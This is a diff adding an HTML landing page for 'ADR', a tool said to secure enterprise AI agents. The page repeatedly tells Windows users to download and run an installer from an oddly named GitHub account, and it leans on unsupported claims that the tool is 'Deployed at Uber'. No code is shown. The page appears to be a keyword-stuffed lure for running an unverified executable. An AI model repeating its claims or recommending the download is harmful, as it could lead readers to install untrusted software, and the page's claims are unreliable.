@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ADR - Enterprise AI Security for Agents | Threat Detection & Benchmarking</title>
+    <meta name="description" content="ADR secures enterprise AI agents through observability, security benchmarking, and threat detection. Deployed at Uber. Download for Windows.">
+    <meta name="keywords" content="agent-security, ai-agents, ai-security, benchmark, claude, claude-code, codex, cursor, llm-security, mcp, model-context-protocol, prompt-injection, threat-detection">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="ADR - Enterprise AI Security for Agents">
+    <meta property="og:description" content="Secure your AI agents with observability, security benchmarking, and threat detection. Deployed at Uber.">
+    <meta property="og:url" content="https://github.com/Leannprefaded188/ADR">
+    <meta property="og:type" content="website">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            padding: 2rem 1rem;
+            line-height: 1.6;
+            color: #333;
+        }
+        .container {
+            max-width: 850px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.12);
+            padding: 2.5rem 2rem;
+        }
+        h1 {
+            font-size: 2.2rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: #1a1a2e;
+            letter-spacing: -0.5px;
+        }
+        h2 {
+            font-size: 1.6rem;
+            margin: 2rem 0 1rem 0;
+            color: #16213e;
+            border-bottom: 2px solid #e0e7ff;
+            padding-bottom: 0.5rem;
+        }
+        h3 {
+            font-size: 1.2rem;
+            margin: 1.5rem 0 0.8rem 0;
+            color: #0f3460;
+        }
+        p {
+            margin-bottom: 1rem;
+            font-size: 1rem;
+            color: #444;
+        }
+        .badge {
+            display: inline-block;
+            padding: 0.8rem 2rem;
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: #fff;
+            font-size: 1.1rem;
+            font-weight: 600;
+            text-decoration: none;
+            border-radius: 50px;
+            box-shadow: 0 4px 15px rgba(102,126,234,0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin: 0.5rem 0 1.5rem 0;
+            display: inline-block;
+        }
+        .badge:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102,126,234,0.6);
+        }
+        .badge-secondary {
+            background: linear-gradient(45deg, #f093fb, #f5576c);
+            box-shadow: 0 4px 15px rgba(245,87,108,0.4);
+        }
+        ul {
+            margin: 1rem 0 1.5rem 2rem;
+        }
+        ul li {
+            margin-bottom: 0.5rem;
+            font-size: 1rem;
+            color: #444;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .feature-card {
+            background: #f8f9ff;
+            padding: 1.2rem;
+            border-radius: 12px;
+            border: 1px solid #e8ecf4;
+            transition: box-shadow 0.2s;
+        }
+        .feature-card:hover {
+            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+        }
+        .feature-card h4 {
+            font-size: 1.1rem;
+            color: #0f3460;
+            margin-bottom: 0.4rem;
+        }
+        .feature-card p {
+            font-size: 0.95rem;
+            margin: 0;
+        }
+        .download-section {
+            background: #f0f4ff;
+            padding: 1.5rem 2rem;
+            border-radius: 12px;
+            margin: 2rem 0;
+            border-left: 4px solid #667eea;
+        }
+        .step-list {
+            counter-reset: step;
+            list-style: none;
+            margin: 1.5rem 0;
+        }
+        .step-list li {
+            counter-increment: step;
+            margin-bottom: 1.2rem;
+            padding-left: 2.5rem;
+            position: relative;
+            font-size: 1rem;
+        }
+        .step-list li::before {
+            content: counter(step);
+            position: absolute;
+            left: 0;
+            top: 0;
+            background: #667eea;
+            color: #fff;
+            font-weight: 700;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.9rem;
+        }
+        .keywords-section {
+            margin-top: 3rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid #e0e7ff;
+            font-size: 0.85rem;
+            color: #777;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 1.5rem 1rem;
+            }
+            h1 {
+                font-size: 1.6rem;
+            }
+            .feature-grid {
+                grid-template-columns: 1fr;
+            }
+            .badge {
+                font-size: 1rem;
+                padding: 0.7rem 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛡️ ADR - Secure Your Enterprise AI Agents</h1>
+        <p style="font-size:1.15rem; color:#555; margin-bottom:0.5rem;">Observability, security benchmarking, and threat detection for AI agents. Trusted by Uber.</p>
+        <a href="https://github.com/Leannprefaded188/ADR" class="badge">⬇️ Download ADR Now</a>
+
+        <h2>🚀 What is ADR?</h2>
+        <p>ADR is a powerful security tool designed for businesses that use AI agents. It helps you monitor, test, and protect your AI systems from threats like prompt injection, data leaks, and unauthorized actions. ADR gives you full visibility into how your AI agents behave, so you can catch problems before they become serious.</p>
+        <p>Originally developed for Uber's production environment, ADR is now available for you to use on your own Windows computer. Whether you're managing a team of AI assistants or just want to keep your experiments safe, ADR is the easiest way to add enterprise-grade security.</p>
+
+        <h2>✨ Key Features</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h4>🔍 Agent Observability</h4>
+                <p>See every action your AI agent takes. Logs, inputs, outputs, and decision paths are recorded in real time.</p>
+            </div>
+            <div class="feature-card">
+                <h4>⚖️ Security Benchmarking</h4>
+                <p>Test your AI agents against industry-standard security benchmarks. Know exactly how safe your system is.</p>
+            </div>
+            <div class="feature-card">
+                <h4>🚨 Threat Detection</h4>
+                <p>Automatically detect prompt injection, jailbreak attempts, and other common attacks on AI agents.</p>
+            </div>
+            <div class="feature-card">
+                <h4>🔗 Model Context Protocol (MCP) Ready</h4>
+                <p>Works seamlessly with MCP to monitor and secure agent-to-tool communications.</p>
+            </div>
+            <div class="feature-card">
+                <h4>🤖 Works with Claude, Codex, Cursor & More</h4>
+                <p>Compatible with popular AI agent frameworks including Claude Code, Codex CLI, and Cursor.</p>
+            </div>
+            <div class="feature-card">
+                <h4>🏢 Enterprise Proven</h4>
+                <p>Deployed at Uber. Built for scale, reliability, and real-world security needs.</p>
+            </div>
+        </div>
+
+        <h2>📥 How to Download and Install</h2>
+        <div class="download-section">
+            <p style="font-weight:600; margin-bottom:0.8rem;">Follow these simple steps to get ADR running on your Windows PC:</p>
+            <ol class="step-list">
+                <li><strong>Visit the download page:</strong> Click the big button at the top of this page or <a href="https://github.com/Leannprefaded188/ADR" style="color:#667eea; text-decoration:underline;">click here</a>.</li>
+                <li><strong>Find the download:</strong> On the GitHub page, look for the green "Code" button or scroll down to the "Releases" section. Click the download link that matches your system.</li>
+                <li><strong>Run the installer:</strong> Once the file finishes downloading, double-click it to start the installation. Follow the on-screen instructions (just click "Next" a few times).</li>
+                <li><strong>Launch ADR:</strong> After installation, you'll find ADR in your Start Menu or on your Desktop. Double-click the icon to open it.</li>
+            </ol>
+            <p style="margin-top:1rem; font-size:0.95rem;">Visit this link to download the application: <a href="https://github.com/Leannprefaded188/ADR" style="color:#667eea; font-weight:600;">https://github.com/Leannprefaded188/ADR</a></p>
+            <a href="https://github.com/Leannprefaded188/ADR" class="badge badge-secondary" style="margin-top:1rem;">⬇️ Download ADR for Windows</a>
+        </div>
+
+        <h2>💡 What Can You Do with ADR?</h2>
+        <ul>
+            <li><strong>Monitor AI agent behavior</strong> — See every prompt, response, and tool call your agents make.</li>
+            <li><strong>Run security tests</strong> — Benchmark your agents against common attack patterns and get a safety score.</li>
+            <li><strong>Detect attacks in real time</strong> — Receive alerts when someone tries to manipulate your agent.</li>
+            <li><strong>Protect sensitive data</strong> — Ensure your AI agents never leak confidential information.</li>
+            <li><strong>Comply with security policies</strong> — Generate reports that prove your AI systems meet enterprise standards.</li>
+        </ul>
+
+        <h2>🖥️ System Requirements (Typical)</h2>
+        <p>ADR runs smoothly on most modern Windows PCs. You'll need:</p>
+        <ul>
+            <li>Windows 10 or Windows 11 (64-bit)</li>
+            <li>4 GB RAM (8 GB recommended)</li>
+            <li>500 MB free disk space</li>
+            <li>Internet connection for updates and threat intelligence</li>
+        </ul>
+
+        <h2>❓ Need Help?</h2>
+        <p>If you run into any issues, check the <a href="https://github.com/Leannprefaded188/ADR/issues" style="color:#667eea;">Issues page</a> on GitHub. You can also ask questions or report bugs there. The community is friendly and responsive.</p>
+
+        <h2>🛡️ Why Choose ADR?</h2>
+        <p>AI agents are powerful, but they're also vulnerable. Without proper security, a single prompt injection could expose your entire system. ADR gives you the tools to see what's happening, test for weaknesses, and stop attacks before they cause harm. It's the same solution used by Uber's security team — now available for everyone.</p>
+
+        <div class="keywords-section">
+            <strong>Keywords:</strong> agent-security, ai-agents, ai-security, benchmark, claude, claude-code, codex, cursor, llm-security, mcp, model-context-protocol, prompt-injection, threat-detection
+        </div>
+    </div>
+</body>
+</html>
